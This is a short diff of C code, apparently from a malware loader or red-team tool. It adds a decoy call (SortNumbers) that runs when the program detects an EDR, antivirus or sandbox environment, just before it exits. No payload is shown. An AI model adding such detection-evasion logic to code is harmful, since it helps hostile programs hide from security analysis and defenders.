@@ -85,6 +85,7 @@ int main(int argc, char *argv[])
     // Check For EDR/AV/Sandbox env
     if (PerfomChecksEnv())
     {
+        SortNumbers();
         return 0;
     }
 
